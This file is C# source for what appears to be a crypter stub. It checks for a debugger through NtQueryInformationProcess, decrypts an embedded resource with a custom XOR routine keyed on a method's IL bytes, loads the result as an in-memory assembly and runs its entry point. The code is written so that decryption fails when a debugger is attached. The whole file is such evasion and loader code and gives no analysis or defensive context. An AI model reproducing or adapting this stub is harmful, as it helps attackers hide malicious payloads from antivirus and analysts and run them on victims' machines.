using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;

namespace ROSED
{

	internal static class xROSED
	{

		[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
		public static extern int NtQueryInformationProcess([In] IntPtr ProcessHandle, [In] int ProcessInformationClass, out IntPtr ProcessInformation, [In] int ProcessInformationLength, [Optional] out int ReturnLength);


		[STAThread]
		private static void Main()
		{
			IntPtr structure = new IntPtr(0);
			Module module = new StackTrace().GetFrame(0).GetMethod().Module;
			int num;
			xROSED.NtQueryInformationProcess(Process.GetCurrentProcess().Handle, 7, out structure, Marshal.SizeOf<IntPtr>(structure), out num);
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("xROSE");
			byte[] array = new byte[manifestResourceStream.Length + (long)structure.ToInt32()];
			manifestResourceStream.Read(array, structure.ToInt32(), array.Length + structure.ToInt32());
			xROSED.NtQueryInformationProcess(Process.GetCurrentProcess().Handle, 7, out structure, Marshal.SizeOf<IntPtr>(structure), out num);
			byte[] ilasByteArray = module.Assembly.ManifestModule.ResolveMethod(123456789 + structure.ToInt32()).GetMethodBody().GetILAsByteArray();
			array = xROSED.xROSER(array, ilasByteArray);
			Assembly assembly = Assembly.Load(array);
			xROSED.NtQueryInformationProcess(Process.GetCurrentProcess().Handle, 7, out structure, Marshal.SizeOf<IntPtr>(structure), out num);
			MethodInfo entryPoint = assembly.EntryPoint;
			object obj = assembly.CreateInstance(entryPoint.ToString());
			entryPoint.Invoke(obj, null);
		}


		public static byte[] xROSER(byte[] plain, byte[] Key)
		{
			for (int i = 0; i < 5; i++)
			{
				for (int j = 0; j < plain.Length; j++)
				{
					plain[j] ^= Key[j % Key.Length];
					for (int k = 0; k < Key.Length; k++)
					{
						plain[j] = (byte)((int)plain[j] ^ ((int)Key[k] << i ^ k) + j);
					}
				}
			}
			return plain;
		}


		public static byte[] XROSET(byte[] data)
		{
			MemoryStream stream = new MemoryStream(data);
			MemoryStream memoryStream = new MemoryStream();
			using (DeflateStream deflateStream = new DeflateStream(stream, CompressionMode.Decompress))
			{
				deflateStream.CopyTo(memoryStream);
			}
			return memoryStream.ToArray();
		}
	}
}
